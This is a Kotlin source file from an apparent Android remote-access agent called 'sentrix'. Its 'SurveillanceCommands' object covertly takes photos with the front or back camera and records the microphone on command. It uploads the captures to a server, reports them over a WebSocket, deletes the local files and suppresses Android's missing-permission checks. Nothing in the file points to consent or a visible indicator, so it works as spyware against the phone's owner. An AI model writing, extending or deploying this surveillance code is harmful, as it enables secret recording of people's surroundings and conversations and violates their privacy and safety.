package com.sentrix.agent.commands

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import com.sentrix.agent.network.Uploader
import com.sentrix.agent.network.WebSocketClient
import kotlinx.coroutines.*
import kotlinx.coroutines.suspendCancellableCoroutine
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import kotlin.coroutines.resume

object SurveillanceCommands {
    private const val TAG = "Surveillance"

    // ── Microphone state ──────────────────────────────────────────
    private var recorder: MediaRecorder? = null
    private var recFile: File? = null
    private var isRecording = false

    // ── Camera ────────────────────────────────────────────────────
    @SuppressLint("MissingPermission")
    suspend fun capturePhoto(ctx: Context, front: Boolean, ws: WebSocketClient, action: String): String {
        val mgr    = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val camId  = mgr.cameraIdList.firstOrNull { id ->
            val facing = if (front) CameraCharacteristics.LENS_FACING_FRONT
                         else       CameraCharacteristics.LENS_FACING_BACK
            mgr.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
        } ?: return "Camera not found"

        val outFile = File(ctx.cacheDir, "photo_${System.currentTimeMillis()}.jpg")
        return try {
            withTimeout(15_000L) { captureImage(mgr, camId, outFile) }
            val url = Uploader.upload(outFile, "image/jpeg")
            ws.send(Uploader.resultJson(action, url))
            outFile.delete()
            if (url != null) "Photo captured" else "Photo captured (upload failed)"
        } catch (e: Exception) {
            Log.e(TAG, "capturePhoto: ${e.message}")
            "Capture failed: ${e.message}"
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun captureImage(mgr: CameraManager, camId: String, out: File) =
        suspendCancellableCoroutine<Unit> { cont ->
            val thread  = HandlerThread("cam").also { it.start() }
            val handler = Handler(thread.looper)
            val chars   = mgr.getCameraCharacteristics(camId)
            val sizes   = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
                              .getOutputSizes(ImageFormat.JPEG)
            val size    = sizes.sortedByDescending { it.width * it.height }
                              .getOrElse(sizes.size / 2) { sizes.first() }
            val reader  = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)

            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buf = img.planes[0].buffer
                val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                img.close()
                FileOutputStream(out).use { it.write(bytes) }
                reader.close(); thread.quit()
                if (cont.isActive) cont.resume(Unit)
            }, handler)

            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    val surface = reader.surface
                    cam.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(surface)
                                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                            }.build()
                            s.capture(req, null, handler)
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) { cam.close(); thread.quit(); if (cont.isActive) cont.resume(Unit) }
                    }, handler)
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close(); thread.quit() }
                override fun onError(cam: CameraDevice, e: Int) { cam.close(); thread.quit(); if (cont.isActive) cont.resume(Unit) }
            }, handler)
        }

    // ── Microphone ────────────────────────────────────────────────
    fun startMicRecord(ctx: Context): String {
        if (isRecording) return "Already recording"
        recFile = File(ctx.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
        recorder = (if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()).apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(44100)
            setAudioEncodingBitRate(128000)
            setOutputFile(recFile!!.absolutePath)
            prepare(); start()
        }
        isRecording = true
        return "Mic recording started"
    }

    fun stopMicRecord(ws: WebSocketClient): String {
        if (!isRecording || recorder == null) return "Not recording"
        recorder!!.stop(); recorder!!.release(); recorder = null; isRecording = false
        val file = recFile ?: return "No output file"
        CoroutineScope(Dispatchers.IO).launch {
            val url = Uploader.upload(file, "audio/mp4")
            ws.send(Uploader.resultJson("mic_stop", url))
            file.delete()
        }
        return "Mic stopped — uploading"
    }

    fun isRecording() = isRecording
}
